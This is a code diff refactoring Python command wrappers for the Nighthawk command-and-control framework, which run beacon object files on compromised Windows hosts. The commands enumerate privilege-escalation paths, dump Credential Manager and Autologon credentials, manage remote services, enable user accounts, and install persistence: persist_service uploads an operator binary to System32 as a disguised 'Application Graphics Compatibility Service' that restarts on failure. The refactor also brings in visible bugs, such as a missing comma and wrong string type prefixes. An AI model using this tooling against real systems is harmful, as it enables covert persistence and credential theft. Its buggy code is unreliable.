+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
-        
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/AlwaysInstallElevatedCheck/AlwaysInstallElevatedCheck.{info.Agent.ProcessArch}.o")
 
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return False
-    nighthawk.console_write(CONSOLE_INFO, "executing AlwaysInstallElevated BOF")
-    notification = api.execute_bof(
-        f"AlwaysInstallElevatedCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("AlwaysInstallElevatedCheck", "bin/PrivCheck/AlwaysInstallElevatedCheck/AlwaysInstallElevatedCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1190,36 +877,12 @@ def autologon_check(params, info):
     """
     Check for stored Autologon credentials in registry.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Construct the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/AutologonCheck/AutologonCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return False
-
-    nighthawk.console_write(CONSOLE_INFO, "executing AutologonCheck BOF")
-    notification = api.execute_bof(
-        f"AutologonCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("AutologonCheck", "bin/PrivCheck/AutologonCheck/AutologonCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1242,36 +905,12 @@ def credential_manager_check(params, info):
     """
     Enumerate credentials from Windows Credential Manager.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/CredentialManagerCheck/CredentialManagerCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing CredentialManagerCheck BOF")
-    notification = api.execute_bof(
-        f"CredentialManagerCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("CredentialManagerCheck", "bin/PrivCheck/CredentialManagerCheck/CredentialManagerCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1296,36 +935,12 @@ def hijackable_path_check(params, info):
     """
     Check for writable directories in system PATH.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/HijackablePathCheck/HijackablePathCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing HijackablePathCheck BOF")
-    notification = api.execute_bof(
-        f"HijackablePathCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("HijackablePathCheck", "bin/PrivCheck/HijackablePathCheck/HijackablePathCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1349,36 +964,12 @@ def modifiable_autorun_check(params, info):
     """
     Check for modifiable autorun executables.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/ModifiableAutorunCheck/ModifiableAutorunCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing ModifiableAutorunCheck BOF")
-    notification = api.execute_bof(
-        f"ModifiedAutorunCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("ModifiableAutorunCheck", "bin/PrivCheck/ModifiableAutorunCheck/ModifiableAutorunCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1403,36 +994,12 @@ def token_privileges_check(params, info):
     """
     Enumerate current token privileges.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/TokenPrivilegesCheck/TokenPrivilegesCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing TokenPrivilegesCheck BOF")
-    notification = api.execute_bof(
-        f"TokenPrivilegesCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("TokenPrivilegesCheck", "bin/PrivCheck/TokenPrivilegesCheck/TokenPrivilegesCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1452,36 +1019,12 @@ def unquoted_svc_path_check(params, info):
     """
     Check for Unquoted Service Paths vulnerability.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/UnquotedSVCPathCheck/UnquotedSVCPathCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing UnquotedSVCPathCheck BOF")
-    notification = api.execute_bof(
-        f"UnquotedSVCPathCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("UnquotedSVCPathCheck", "bin/PrivCheck/UnquotedSVCPathCheck/UnquotedSVCPathCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1507,36 +1050,12 @@ def powershell_history_check(params, info):
     """
     Check for PowerShell history file.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/PowerShellHistoryCheck/PowerShellHistoryCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing PowerShellHistoryCheck BOF")
-    notification = api.execute_bof(
-        f"PowerShellHistoryCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("PowerShellHistoryCheck", "bin/PrivCheck/PowerShellHistoryCheck/PowerShellHistoryCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1560,36 +1079,12 @@ def uac_status_check(params, info):
     """
     Check UAC status, integrity level, and admin membership.
     """
-
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/UACStatusCheck/UACStatusCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing UACStatusCheck BOF")
-    notification = api.execute_bof(
-        f"UACStatusCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("UACStatusCheck", "bin/PrivCheck/UACStatusCheck/UACStatusCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1617,36 +1112,12 @@ def modifiable_svc_check(params, info):
     """
     Check for services with modifiable permissions.
     """
-    
-    packer = Packer()
-    packed_params = packer.getbuffer()
-
+    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    packed_params = pack_params()
     if type(packed_params) != bytes:
         return False
 
-    # Constructing the path to the BOF file
-    bof_path = nighthawk.script_resource(f"bin/PrivCheck/ModifiableSVCCheck/ModifiableSVCCheck.{info.Agent.ProcessArch}.o")
-    
-    try:
-        with open(bof_path, 'rb') as f:
-            bof = f.read()
-    except FileNotFoundError:
-        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
-        return
-
-    nighthawk.console_write(CONSOLE_INFO, "executing ModifiableSVCCheck BOF")
-    notification = api.execute_bof(
-        f"ModifiableSVCCheck.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("ModifiableSVCCheck", "bin/PrivCheck/ModifiableSVCCheck/ModifiableSVCCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
     return True
 
 nighthawk.register_command(
@@ -1751,44 +1222,23 @@ def sc_config(params, info):
     """
     This command configures an existing service on the target host.
     """
-
-    if len(params) < 4:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 4:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>")
         return False
 
     hostname = ""
-    servicename = params[0]
-    binpath = params[1]
-    errmode = int(params[2])
-    startmode = int(params[3])
-    if len(params) >= 5: hostname = params[4]
+    servicename = command_params[0]
+    binpath = command_params[1]
+    errmode = command_params[2]
+    startmode = command_params[3]
+    if len(command_params) >= 5: hostname = command_params[4]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addstr(servicename)
-    packer.addstr(binpath)
-    packer.addshort(errmode)
-    packer.addshort(startmode)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"z{servicename}", f"z{binpath}", f"s{errmode}", f"s{startmode}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_config/sc_config.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing sc_config BOF")
-    notification = api.execute_bof(
-        f"sc_config.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_config", "bin/Remote/sc_config/sc_config", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     sc_config,
@@ -1825,51 +1275,27 @@ def sc_create(params, info):
     """
     This command configures a new service on the target host.
     """
-
-    if len(params) < 7:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 7:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>")
         return False
 
     hostname = ""
-    servicename = params[0]
-    displayname = params[1]
-    binpath = params[2]
-    description = params[3]
-    errmode = int(params[4])
-    startmode = int(params[5])
+    servicename = command_params[0]
+    displayname = command_params[1]
+    binpath = command_params[2]
+    description = command_params[3]
+    errmode = int(command_params[4])
+    startmode = int(command_params[5])
     svctype = 3
-    if len(params) >= 7: svctype = params[6]
-    if len(params) >= 8: hostname = params[7]
+    if len(command_params) >= 7: svctype = command_params[6]
+    if len(command_params) >= 8: hostname = command_params[7]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addstr(servicename)
-    packer.addstr(binpath)
-    packer.addstr(displayname)
-    packer.addstr(description)
-    packer.addshort(errmode)
-    packer.addshort(startmode)
-    packer.addshort(svctype)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"z{servicename}", f"z{binpath}", f"z{displayname}", f"z{description}" f"s{errmode}", f"s{startmode}", f"s{svctype}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_create/sc_create.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing sc_create BOF")
-    notification = api.execute_bof(
-        f"sc_create.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_create", "bin/Remote/sc_create/sc_create", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     sc_create,
@@ -1919,38 +1345,20 @@ def sc_delete(params, info):
     """
      Deletes a service
     """
-
-    if len(params) < 1:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 1:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_delete <SVCNAME> <OPT:HOSTNAME>")
         return False
 
     hostname = ""
-    servicename = params[0]
-    if len(params) >= 2: hostname = params[1]
+    servicename = command_params[0]
+    if len(command_params) >= 2: hostname = command_params[1]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addstr(servicename)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_delete/sc_delete.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing sc_delete BOF")
-    notification = api.execute_bof(
-        f"sc_delete.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_delete", "bin/Remote/sc_delete/sc_delete", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     sc_delete,
@@ -1976,38 +1384,20 @@ def sc_stop(params, info):
     """
     This command stops the specified service on the target host.
     """
-
-    if len(params) < 1:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 1:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_stop <SVCNAME> <OPT:HOSTNAME>")
         return False
 
     hostname = ""
-    servicename = params[0]
-    if len(params) >= 2: hostname = params[1]
+    servicename = command_params[0]
+    if len(command_params) >= 2: hostname = command_params[1]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addstr(servicename)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_stop/sc_stop.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing sc_stop BOF")
-    notification = api.execute_bof(
-        f"sc_stop.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_stop", "bin/Remote/sc_stop/sc_stop", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     sc_stop,
@@ -2033,38 +1423,20 @@ def sc_start(params, info):
     """
     This command starts the specified service on the target host.
     """
-
-    if len(params) < 1:
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 1:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_start <SVCNAME> <OPT:HOSTNAME>")
         return False
 
     hostname = ""
-    servicename = params[0]
-    if len(params) >= 2: hostname = params[1]
+    servicename = command_params[0]
+    if len(command_params) >= 2: hostname = command_params[1]
 
-    packer = Packer()
-    packer.addstr(hostname)
-    packer.addstr(servicename)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{hostname}", f"z{servicename}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_start/sc_start.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing sc_start BOF")
-    notification = api.execute_bof(
-        f"sc_start.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_start", "bin/Remote/sc_start/sc_start", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     sc_start,
@@ -2090,38 +1462,20 @@ def enableuser(params, info):
     """
     Activates (and if necessary enables) the specified user account on the target computer. 
     """
-
-    if len(params) < 7:
-        nighthawk.console_write(CONSOLE_ERROR, "Usage: enableuser <SVCNAME> <OPT:HOSTNAME>")
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) < 1:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: enableuser <USERNAME> <OPT:DOMAIN>")
         return False
 
     domain = ""
-    username = params[0]
-    if len(params) >= 2: domain = params[1]
+    username = command_params[0]
+    if len(command_params) >= 2: domain = command_params[1]
 
-    packer = Packer()
-    packer.addstr(domain)
-    packer.addstr(username)
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params(f"z{domain}", f"z{username}")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/enableuser/enableuser.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    nighthawk.console_write(CONSOLE_INFO, "executing enableuser BOF")
-    notification = api.execute_bof(
-        f"enableuser.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("enableuser", "bin/Remote/enableuser/enableuser", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     enableuser,
@@ -2149,96 +1503,46 @@ def persist_service(params, info):
     """
     Create persistence as windows service
     """
-
-    if len(params) > 0:
-        svcbinary = params[0]
+    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
+    if len(command_params) > 0:
+        svcbinary = command_params[0]
         nighthawk.console_write(CONSOLE_INFO, "upload service binary to \"C:\\Windows\\System32\\agcssvc.exe\"")
         api.upload(svcbinary, "C:\\Windows\\System32\\agcssvc.exe")
         time.sleep(30)
 
-    packer = Packer()
-    packer.addstr("")
-    packer.addstr("agcssvc")
-    packer.addstr("C:\\Windows\\System32\\agcssvc.exe")
-    packer.addstr("Application Graphics Compatibility Service")
-    packer.addstr("Enables enhanced compatibility and rendering for legacy applications using AGC graphics components.")
-    packer.addshort(0)
-    packer.addshort(2)
-    packer.addshort(16)
-    packed_params = packer.getbuffer()
+    domain = ""
+    username = command_params[0]
+    if len(command_params) >= 2: domain = command_params[1]
 
+    packed_params = pack_params(
+        "s",
+        "sagcssvc",
+        "sC:\\Windows\\System32\\agcssvc.exe",
+        "sApplication Graphics Compatibility Service",
+        "sEnables enhanced compatibility and rendering for legacy applications using AGC graphics components.",
+        f"s{0}",
+        f"s{2}",
+        f"s{16}"
+        )
     if type(packed_params) != bytes:
         return False
-
-    with open(nighthawk.script_resource(f"bin/Remote/sc_create/sc_create.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
+        
     nighthawk.console_write(CONSOLE_INFO, "registering new windows service \"agcssvc\" with sc_create BOF")
-    notification = api.execute_bof(
-        f"sc_create.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
-
+    base_execute_bof("sc_create", "bin/Remote/sc_create/sc_create", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
     nighthawk.console_write(CONSOLE_INFO, "configure auto restart on failure for windows service \"agcssvc\" with sc_failure BOF")
-    packer = Packer()
-    packer.addstr("")
-    packer.addstr("agcssvc")
-    packer.addint32(3)
-    packer.addstr("")
-    packer.addstr("")
-    packer.addshort(3)
-    packer.addstr("1/1/1/1/1/1")
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params("s", "sagcssvc", f"i{3}", "s", "s", f"s{3}", "s1/1/1/1/1/1")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_failure/sc_failure.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    notification = api.execute_bof(
-        f"sc_failure.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_failure", "bin/Remote/sc_failure/sc_failure", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
     nighthawk.console_write(CONSOLE_INFO, "start windows service \"agcssvc\" with sc_start BOF")
-    packer = Packer()
-    packer.addstr("")
-    packer.addstr("agcssvc")
-    packed_params = packer.getbuffer()
-
+    packed_params = pack_params("s", "sagcssvc")
     if type(packed_params) != bytes:
         return False
 
-    with open(nighthawk.script_resource(f"bin/Remote/sc_start/sc_start.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
-    notification = api.execute_bof(
-        f"sc_start.{info.Agent.ProcessArch}.o",
-        bof,
-        packed_params,
-        "go",
-        False,
-        0,
-        True,
-        "",
-        sync=True
-    )
-    write_output(notification)
+    base_execute_bof("sc_start", "bin/Remote/sc_start/sc_start", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
 nighthawk.register_command(
     persist_service,
